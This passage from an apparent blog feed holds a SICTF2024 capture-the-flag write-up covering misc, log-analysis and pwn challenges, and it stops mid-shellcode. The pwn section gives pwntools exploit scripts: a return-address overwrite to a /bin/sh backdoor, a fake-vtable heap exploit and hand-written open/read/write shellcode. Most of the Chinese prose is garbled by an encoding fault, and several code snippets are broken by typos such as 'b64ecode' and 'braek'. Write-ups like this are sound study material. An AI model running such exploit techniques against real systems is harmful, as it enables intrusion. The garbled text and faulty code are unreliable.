class="number">0x400560</span>:</span><br><span class="line">value = mu.reg_read(UC_X86_REG_RDI)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(value))</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;capstoneã€keystoneä¸unicorn-1&quot;&gt;&lt;a href=&quot;#capstoneã€keystoneä¸unicorn-1&quot; class=&quot;headerlink&quot; title=&quot;capstoneã€keystoneä¸unicorn-1&quot;&gt;&lt;/a&gt;capst</summary>
      
    
    
    
    
    <category term="RE CTF" scheme="https://github.com/xyy9233/xyy9233.github.io.git/tags/RE-CTF/"/>
    
  </entry>
  
  <entry>
    <title>SICTF2024</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/02/26/SICTF2024/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/02/26/SICTF2024/</id>
    <published>2024-02-25T16:00:00.000Z</published>
    <updated>2024-09-16T07:11:16.081Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SICTF2024"><a href="#SICTF2024" class="headerlink" title="SICTF2024"></a>SICTF2024</h1><h2 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h2><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="çœŸğŸ’¨ç­¾åˆ°"><a href="#çœŸğŸ’¨ç­¾åˆ°" class="headerlink" title="çœŸğŸ’¨ç­¾åˆ°"></a>çœŸğŸ’¨ç­¾åˆ°</h3><ul><li>åŠ å¯†zipæ–‡ä»¶åŒ…æœ€åä¸€ä¸²æ•°å­—ï¼Œ5456545454565458414259555854585458434152595958415a435959595558563d<ul><li>16è¿›åˆ¶è½¬å­—ç¬¦TVTTTVTXABYUXTXTXCARYYXAZCYYYUXV&#x3D;</li><li><a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=zimu">å­—ç¬¦æ–‡æœ¬è§£å¯†</a> 2024HappyNewYear</li></ul></li><li>zipè§£å‹åä¸€ä¸ªéŸ³é¢‘ä¸€ä¸ªå›¾ç‰‡<ul><li>éŸ³é¢‘ç”¨Audacity <strong>æ³¨æ„éŸ³é¢‘åç§°</strong></li><li>ç”¨steghideè§£ç   steghide extract -sf steg.jpg</li></ul></li></ul><h3 id="New-Yearâ€™s-regret"><a href="#New-Yearâ€™s-regret" class="headerlink" title="New Yearâ€™s regret"></a>New Yearâ€™s regret</h3><ul><li><p>å¯†ç æ˜¯2024SICTF</p></li><li><p>01ç”»å›¾ï¼ˆèµ›åšå¨å­ï¼‰ï¼Œæ±‰ä¿¡ç ï¼Œä»¥åŠå‹ç¼©åŒ…æœ«å°¾å‘ç°å­—ç¬¦ä¸²ï¼Œå°è¯•hexç¼–ç ï¼ˆè€ƒè™‘é€†å‘è¾“å…¥ï¼‰</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">&#x27;43637d135333&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(s[::-<span class="number">1</span>])</span><br><span class="line"><span class="comment">#333531d73634--&gt;351Ã—64</span></span><br></pre></td></tr></table></figure><p>ç”»å›¾ï¼š</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">MAX1=<span class="number">351</span></span><br><span class="line">MAX2=<span class="number">64</span></span><br><span class="line">pic = Image.new(<span class="string">&quot;RGB&quot;</span>,(MAX1,MAX2))</span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;01ç &quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,MAX2):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,MAX1):</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">str</span>[i]==<span class="string">&#x27;1&#x27;</span>):</span><br><span class="line">            pic.putpixel([x,y],(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            pic.putpixel([x,y],(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line">        i=i+<span class="number">1</span></span><br><span class="line">pic.show()</span><br><span class="line">pic.save(<span class="string">&quot;flag.png&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240226121035339.png" alt="image-20240226121035339"></p><ul><li>music-sheet-cipherè§£ç å¾—ä¸€éƒ¨åˆ†ï¼š</li></ul><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240226121133988.png" alt="image-20240226121133988"></p><ul><li><p>010å¦ä¸€æ–‡ä»¶æœ‰å‹ç¼©åŒ…å’Œpngå›¾ç‰‡ï¼Œkaliåˆ†ç¦»<br>å‹ç¼©åŒ…è§£å‹base64å¾ªç¯</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> bases64 <span class="keyword">import</span> b64ecode</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">process_data</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data=re.sub(<span class="string">r&#x27;flag|[â¼€-é¾¥]&#x27;</span>,<span class="string">&#x27;&#x27;</span>,data)</span><br><span class="line">        decode_data=b64ecode(data)</span><br><span class="line">        <span class="keyword">return</span> decode_data.decode(),<span class="literal">True</span></span><br><span class="line">  <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> data.<span class="literal">False</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag_new.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;ute-8&#x27;</span>)<span class="keyword">as</span> file:</span><br><span class="line">    date = file.read()</span><br><span class="line">iterations = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    data,can_decode=process_data(data)</span><br><span class="line">    iterations+=<span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> can_decode:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;result&quot;</span>,data)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;rotatin&quot;</span>,iterations)</span><br><span class="line">        braek</span><br></pre></td></tr></table></figure></li><li><p>æˆ˜åŒå¸•ç±³ä»€æ­¦å™¨æ˜Ÿçº§ï¼Œï¼Œï¼Œ</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">44664654464566654465645644544664654654644546445446646565444454544664654664544545646454544454466465465645644</span><br></pre></td></tr></table></figure><p>è€ƒè™‘æ‘©æ–¯å¯†ç ï¼Œ4ä¸ºâ€.â€,6â€-â€œ,5ä¸ºç©ºæ ¼</p><p>ä¸‰éƒ¨åˆ†æ‹¼èµ·æ¥</p></li></ul></li></ul><h3 id="GeekChallege"><a href="#GeekChallege" class="headerlink" title="GeekChallege"></a>GeekChallege</h3><h3 id="ç¥ç§˜çš„æµé‡"><a href="#ç¥ç§˜çš„æµé‡" class="headerlink" title="ç¥ç§˜çš„æµé‡"></a>ç¥ç§˜çš„æµé‡</h3><p><em>é¢˜â½¬æè¿°ï¼š</em></p><p><em>flagå€¼ï¼šSICTF{b50936c7-b60d-411e-a91f-304937164b9c}</em></p><p><a href="https://github.com/DidierStevens/Beta/blob/master/cs-extract-key.py">https://github.com/DidierStevens/Beta/blob/master/cs-extract-key.py</a></p><p><a href="https://github.com/DidierStevens/Beta/blob/master/cs-parse-http-traffic.py">https://github.com/DidierStevens/Beta/blob/master/cs-parse-http-traffic.py</a></p><p>ä½¿â½¤ cs-extract-key.py â¼¯å…· å¯ä»¥å¾—åˆ° AES key : HMAC key</p><p>ç„¶åâ½¤ cs-parse-http-traffic.py å°±å¯ä»¥æ‹¿åˆ°æ˜â½‚</p><p>å‚è€ƒèµ„æ–™ï¼š</p><p><a href="https://fdlucifer.github.io/2022/01/05/decrypt-cs-traffic/">https://fdlucifer.github.io/2022/01/05/decrypt-cs-traffic/</a></p><h3 id="WHOï¼ŸWHOï¼ŸWHOï¼Ÿ"><a href="#WHOï¼ŸWHOï¼ŸWHOï¼Ÿ" class="headerlink" title="WHOï¼ŸWHOï¼ŸWHOï¼Ÿ"></a>WHOï¼ŸWHOï¼ŸWHOï¼Ÿ</h3><p>1ã€archprçˆ†ç ´å¯†ç ä¸ºqweqwe</p><p>2ã€ä½¿â½¤é›¶å®½åå¾—åˆ°â¼€ä¸²rabbitè§£å¯†ï¼Œä¸”å¯†ç å°±æ˜¯é—®é¢˜çš„ç­”æ¡ˆï¼Œå¯†ç ä¸ºshumu</p><p>3ã€æ ¹æ®â½‚ä»¶é¢˜â½¬æâ½°ä½¿â½¤DNAè§£å¯†å¾—åˆ°flag</p><h3 id="æ—¥å¿—åˆ†æ-1"><a href="#æ—¥å¿—åˆ†æ-1" class="headerlink" title="æ—¥å¿—åˆ†æ 1"></a>æ—¥å¿—åˆ†æ 1</h3><p>SICTF{é»‘å®¢æ‰€æ¥å…¥çš„IPåœ°å€|é»‘å®¢æ‰€åˆ›å»ºçš„ç”¨æˆ·å|é»‘å®¢æ‰€åŠ å…¥çš„ç”¨æˆ·ç»„|é»‘å®¢åˆ›å»ºçš„è®¡åˆ’å|åˆ›å»ºè®¡åˆ’ä»»åŠ¡çš„å¯¹è±¡åé—¨æ‰€å¤„çš„è·¯å¾„ï¼ˆå°å†™ç›˜ç¬¦â€¦â€¦,åé—¨è·¯å¾„ç²¾ç¡®åˆ°****.exeï¼‰|é»‘å®¢è¿œç¨‹ç™»é™†RDPçš„è´¦æˆ·}<br> åé—¨è·¯å¾„ç²¾ç¡®åˆ°****.exe</p><p>ç›´æ¥ä½¿ç”¨windowså·¥å…·ç­›æŸ¥</p><p>{192.168.222.200|attack$|Administrators|callback|c:\windows\system32\windows_at*</p><p><em>tack.exe|ADOFLMB\attack$}</em></p><h3 id="æ—¥å¿—åˆ†æ2"><a href="#æ—¥å¿—åˆ†æ2" class="headerlink" title="æ—¥å¿—åˆ†æ2"></a>æ—¥å¿—åˆ†æ2</h3><p><em>SICTF{æ”»å‡»è€…çš„IPåœ°å€|æ”»å‡»è€…å¾—åˆ°Webåº”â½¤åå°ç®¡ç†æƒé™çš„â½…æ³•|æ”»å‡»è€…åœ¨SQLæ³¨â¼Šæ”»å‡»è¿‡ç¨‹ä¸­ä½¿â½¤</em></p><p><em>çš„â¾ƒåŠ¨åŒ–â¼¯å…·åç§°|â¼¯å…·ç‰ˆæœ¬å·|æ”»å‡»è€…ä½¿â½¤çš„Webshellè¿æ¥â¼¯å…·ï¼ˆä¸­â½‚åï¼‰|â¼¯å…·ç‰ˆæœ¬å·}</em></p><p><em>flagå€¼ï¼šSICTF{10.11.35.95|æš´â¼’ç ´è§£|sqlmap|1.2.4.18|èšå‰‘|2.1}</em></p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="Signin-pwn"><a href="#Signin-pwn" class="headerlink" title="Signin-pwn"></a>Signin-pwn</h3><p>readä¹‹åè°ƒâ½¤äº†strlenï¼Œå°±ä¼šæŠŠrdiè®¾ç½®ä¸ºbugçš„åœ°å€ï¼Œæ‰€ä»¥åªéœ€è¦bufä»¥&#x2F;bin&#x2F;shå¼€å¤´ï¼Œç„¶åç›´æ¥æ”¹è¿”å›åœ°å€åˆ°backdoorçš„systemé‚£â¾¥å³å¯</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">backdoor=<span class="number">0x4011f4</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;length:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x100</span>).encode())</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;command:&#x27;</span>)</span><br><span class="line">payload = flat([</span><br><span class="line">    <span class="string">b&#x27;/bin/sh\0x00&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x50</span>,</span><br><span class="line">    backdoor</span><br><span class="line">])</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Eeeeasy-Cpp"><a href="#Eeeeasy-Cpp" class="headerlink" title="Eeeeasy Cpp"></a>Eeeeasy Cpp</h3><p>æ€è·¯æ˜¯æ³„éœ²å †åœ°å€ç„¶åä¼ªé€ vtableï¼ŒæŠŠè™šè¡¨æŒ‡é’ˆæŒ‡å‘ä¼ªé€ çš„vtableå†callâ¼€ä¸‹å®Œæˆåˆ©â½¤</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="number">1</span> from pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="number">2</span> context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="number">3</span> context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">5</span> def <span class="built_in">get</span>(name, passwd):</span><br><span class="line"><span class="number">6</span> p.<span class="built_in">recvuntil</span>(b<span class="number">&#x27;</span>&gt;&gt; <span class="string">&#x27;)</span></span><br><span class="line"><span class="string">7 p.sendline(b&#x27;</span>G<span class="number">&#x27;</span>)</span><br><span class="line"><span class="number">8</span> p.<span class="built_in">recvuntil</span>(b<span class="number">&#x27;</span>name: <span class="string">&#x27;)</span></span><br><span class="line"><span class="string">9 p.sendline(name)</span></span><br><span class="line"><span class="string">10 p.recvuntil(b&#x27;</span>password: <span class="string">&#x27;)</span></span><br><span class="line"><span class="string">11 p.sendline(passwd)</span></span><br><span class="line"><span class="string">12</span></span><br><span class="line"><span class="string">13 def show():</span></span><br><span class="line"><span class="string">14 p.recvuntil(b&#x27;</span>&gt;&gt; <span class="string">&#x27;)</span></span><br><span class="line"><span class="string">15 p.sendline(b&#x27;</span>P<span class="number">&#x27;</span>)</span><br><span class="line"><span class="number">1617</span> <span class="meta">#p = process(<span class="string">&#x27;./EeeeasyCpp&#x27;</span>)</span></span><br><span class="line"><span class="number">18</span> p = <span class="built_in">remote</span>(<span class="string">&#x27;xxxxxx&#x27;</span>, xxxx)</span><br><span class="line"><span class="number">19</span> <span class="meta"># set offset to 0x40 to check <span class="keyword">if</span> the offset is correct by comparing with vtable</span></span><br><span class="line"><span class="number">20</span> offset = <span class="number">0x48</span></span><br><span class="line"><span class="number">21</span> <span class="keyword">try</span>:</span><br><span class="line"><span class="number">22</span> p.<span class="built_in">recvuntil</span>(b<span class="number">&#x27;</span>gift: <span class="string">&#x27;)</span></span><br><span class="line"><span class="string">23 main = int(p.recvuntil(b&#x27;</span>\n<span class="number">&#x27;</span>)[:<span class="number">-1</span>], <span class="number">16</span>)</span><br><span class="line"><span class="number">24</span> base = main - <span class="number">0x2650</span></span><br><span class="line"><span class="number">25</span> <span class="built_in">success</span>(<span class="string">&#x27;base addr -&gt; &#123;&#125;&#x27;</span>.format(<span class="built_in">hex</span>(base)))</span><br><span class="line"><span class="number">26</span> backdoor = base + <span class="number">0x22e0</span></span><br><span class="line"><span class="number">27</span> vtable = base + <span class="number">0x4d48</span></span><br><span class="line"><span class="number">28</span></span><br><span class="line"><span class="number">29</span> <span class="built_in">info</span>(<span class="string">&#x27;vtable -&gt; &#123;&#125;&#x27;</span>.format(<span class="built_in">hex</span>(vtable)))</span><br><span class="line"><span class="number">30</span> <span class="meta">#gdb.attach(p)</span></span><br><span class="line"><span class="number">31</span> <span class="built_in">get</span>(</span><br><span class="line"><span class="number">32</span> b<span class="number">&#x27;123&#x27;</span>,</span><br><span class="line"><span class="number">33</span> <span class="built_in">flat</span>([</span><br><span class="line"><span class="number">34</span> b<span class="number">&#x27;</span>a<span class="number">&#x27;</span> * <span class="number">0x10</span>,</span><br><span class="line"><span class="number">35</span> <span class="number">0</span>, <span class="number">0x21</span>,</span><br><span class="line"><span class="number">36</span> vtable, <span class="built_in">bytes</span>([offset])</span><br><span class="line"><span class="number">37</span> ])</span><br><span class="line"><span class="number">38</span> )</span><br><span class="line"><span class="number">39</span> <span class="built_in">show</span>()</span><br><span class="line"><span class="number">40</span> p.<span class="built_in">recvuntil</span>(b<span class="number">&#x27;</span>Name: <span class="string">&#x27;)</span></span><br><span class="line"><span class="string">41 ptr = u64(p.recvuntil(b&#x27;</span>\n<span class="number">&#x27;</span>)[:<span class="number">-1</span>].<span class="built_in">ljust</span>(<span class="number">8</span>, b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line"><span class="number">42</span> <span class="meta"># heap</span></span><br><span class="line"><span class="number">43</span> <span class="built_in">success</span>(<span class="string">&#x27;ptr -&gt; &#123;&#125;&#x27;</span>.format(<span class="built_in">hex</span>(ptr)))</span><br><span class="line"><span class="number">44</span> <span class="keyword">if</span> ptr == <span class="number">0</span>:</span><br><span class="line"><span class="number">45</span> raise <span class="built_in">Exception</span>(<span class="string">&#x27;name addr is 0&#x27;</span>)</span><br><span class="line"><span class="number">46</span> <span class="meta"># rollback</span></span><br><span class="line"><span class="number">47</span> name_addr = ptr - <span class="number">0x38</span></span><br><span class="line"><span class="number">48</span> <span class="built_in">get</span>(</span><br><span class="line"><span class="number">49</span> <span class="built_in">flat</span>([name_addr]),</span><br><span class="line"><span class="number">50</span> <span class="built_in">flat</span>([<span class="number">0x21</span>])</span><br><span class="line"><span class="number">51</span> )</span><br><span class="line"><span class="number">52</span> <span class="meta"># <span class="keyword">if</span> name is 123, rollback success</span></span><br><span class="line"><span class="number">53</span> <span class="meta"># show()</span></span><br><span class="line"><span class="number">54</span> fake_vtable = name_addr</span><br><span class="line"><span class="number">55</span> <span class="built_in">get</span>(</span><br><span class="line"><span class="number">56</span> <span class="built_in">flat</span>([backdoor, backdoor]), <span class="meta"># check by setting backdoor to main</span></span><br><span class="line"><span class="number">57</span> <span class="built_in">flat</span>([</span><br><span class="line"><span class="number">58</span> b<span class="number">&#x27;</span>a<span class="number">&#x27;</span> * <span class="number">0x10</span>,</span><br><span class="line"><span class="number">59</span> <span class="number">0</span>, <span class="number">0x21</span>,</span><br><span class="line"><span class="number">60</span> fake_vtable, name_addr</span><br><span class="line"><span class="number">61</span> ])</span><br><span class="line"><span class="number">62</span> )</span><br><span class="line"><span class="number">63</span> <span class="meta"># get or show will trigger the backdoor</span></span><br><span class="line"><span class="number">64</span> <span class="built_in">show</span>()</span><br><span class="line"><span class="number">65</span> p.<span class="built_in">interactive</span>()</span><br><span class="line"><span class="number">66</span></span><br><span class="line"><span class="number">67</span> except Exception as e:</span><br><span class="line"><span class="number">68</span> <span class="built_in">print</span>(<span class="string">&quot;error: &quot;</span>, e)</span><br><span class="line"><span class="number">69</span> p.<span class="built_in">close</span>()</span><br></pre></td></tr></table></figure><h3 id="Bug-Zapper"><a href="#Bug-Zapper" class="headerlink" title="Bug Zapper"></a>Bug Zapper</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">æ‚¨æ˜¯å¦ç»å¸¸è¢«bugçƒ¦æ¼ï¼Ÿæ‚¨æ˜¯å¦æƒ³è¦â¼€æ¬¾å®‰å…¨ï¼Œâ¾¼æ•ˆï¼Œæ²¡æœ‰ä»»ä½•é¢å¤–å‰¯äº§å‡ºçš„æ€â¾å™¨ï¼Ÿ*</span><br><span class="line"></span><br><span class="line">*è¯·é€‰æ‹©æˆ‘ä»¬ï¼æˆ‘ä»¬æ˜¯å€¼å¾—æ‚¨ä¿¡èµ–çš„æ€â¾ä¸“å®¶ï¼â½†è®ºä»€ä¹ˆbugï¼Œæˆ‘ä»¬éƒ½èƒ½â½´å³ç”„åˆ«å¹¶å¤„ç†ï¼æˆ‘ä»¬Bug*</span><br><span class="line"></span><br><span class="line">*Zapperéƒ‘é‡æ‰¿è¯ºï¼Œç»ä¸æ”¾è¿‡ä»»ä½•â¼€ä¸ªshellcodeï¼*</span><br><span class="line"></span><br><span class="line">*Bug Zapperç­â¾å‰‚ï¼Œâ¼€æ‰«å°±ç­ï¼Œè®©bugâ½†å¤„å¯é€ƒï¼*</span><br><span class="line"></span><br><span class="line">*Bug Zapperç­â¾å‰‚ï¼Œè®©ä½ å†™çš„å¼€â¼¼ï¼Œâ½¤çš„æ”¾â¼¼ã€‚</span><br></pre></td></tr></table></figure><p>è¾“â¼Šâ»“åº¦ä¸â¼¤äº0x10ï¼Œä½¿å¾—syscallçš„æ—¶å€™è°ƒâ½¤å·åœ¨0x55ï¼ˆcreatï¼‰åˆ°0x65ï¼ˆptraceï¼‰</p><p>ç„¶åéœ€è¦åœ¨å‰ä¸‰ä¸ªå‚æ•°éƒ½æ˜¯0çš„æƒ…å†µä¸‹ï¼Œsyscallåè¿”å›å€¼ä¸º0ï¼Œæœ‰3ä¸ªè°ƒâ½¤å¯ä»¥ç¬¦åˆ</p><p>åˆ†åˆ«æ˜¯fchmodï¼ˆ0x5bï¼‰ï¼Œ gettimeofdayï¼ˆ0x60ï¼‰ï¼Œptraceï¼ˆ0x65ï¼‰</p><p>ä¹Ÿå°±æ˜¯åˆ†åˆ«å¯¹åº”äº†è¾“â¼Šâ»“åº¦ä¸º6ï¼Œ11ï¼Œ16å­—èŠ‚ã€‚ï¼ˆæ³¨æ„ptraceåœ¨åŠ¨è°ƒæ—¶æ˜¯è¿”å›-1çš„ï¼‰</p><p>æˆ‘ä»¬ç›´æ¥ä½¿â½¤ptraceæ‰“ï¼ˆè¿™é¢˜å…¶å®11å­—èŠ‚å°±å¤Ÿäº†ï¼Œä¹Ÿå°±æ˜¯gettimeofdayå°±èƒ½è¿‡ï¼Œè°ƒè¯•ä¹Ÿç›¸å¯¹â½…ä¾¿ï¼‰ï¼Œâ»“åº¦ä¸å¤Ÿå°±æŠŠç¬¬â¼†æ®µpayloadç»™readåˆ°0x1919820åâ¾¯ï¼Œç„¶åå°±æ˜¯â¼€æ³¢orwï¼Œä¸è¿‡è¦æ³¨æ„ï¼Œè¿™â¾¥è°ƒâ½¤execveä¼šå¤±è´¥ï¼Œç›´æ¥â½¤pwntoolsçš„shellcraftåº”è¯¥æ˜¯ä¸â¾çš„</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="number">2</span> context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="number">3</span> context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">5</span> p = process(<span class="string">&#x27;./bugzapper&#x27;</span>)</span><br><span class="line"><span class="number">6</span></span><br><span class="line"><span class="number">7</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">8 add rax, 0x10 ; rax = 0x1919820</span></span><br><span class="line"><span class="string">9 mov rsi, rax</span></span><br><span class="line"><span class="string">10 mov edx, 0x80</span></span><br><span class="line"><span class="string">11 xor eax, eax</span></span><br><span class="line"><span class="string">12 syscall</span></span><br><span class="line"><span class="string">13 &#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="number">14</span> payload = <span class="string">b&#x27;H\x83\xc0\x10H\x89\xc6\xba\x80\x00\x00\x001\xc0\x0f\x05&#x27;</span></span><br><span class="line"><span class="number">15</span> <span class="comment"># assert len(payload) == 0x10</span></span><br><span class="line"><span class="number">16</span></span><br><span class="line"><span class="number">17</span> p.recv()</span><br><span class="line"><span class="number">18</span> p.send(payload)</span><br><span class="line"><span class="number">19</span></span><br><span class="line"><span class="number">20</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">21 mov eax, 0x67616c66</span></span><br><span class="line"><span class="string">22 mov [esi - 0x10], rax</span></span><br><span class="line"><span class="string">23</span></span><br><span class="line"><span class="string">24 // è¿™â¾¥æ˜¯ç¡®è®¤ &quot;flag&quot; å·²ç»å†™â¼Šäº† 0x1919810</span></span><br><span class="line"><span class="string">25 // write(1, 0x1919810, 0x20)</span></span><br><span class="line"><span class="string">26 mov edi, 1</span></span><br><span class="line"><span class="string">27 sub esi, 0x10 ; rsi = 0x1919810</span></span><br><span class="line"><span class="string">28 mov edx, 0x20</span></span><br><span class="line"><span class="string">29 mov eax, 0x1</span></span><br><span class="line"><span class="string">30 syscall</span></span><br><span class="line"><span class="string">31</span></span><br><span class="line"><span class="string">32 // open(&quot;flag&quot;, 0, 0)</span></span><br><span class="line"><span class="string">33 mov edi, esi</span></span><br><span class="line"><span class="string">34 xor 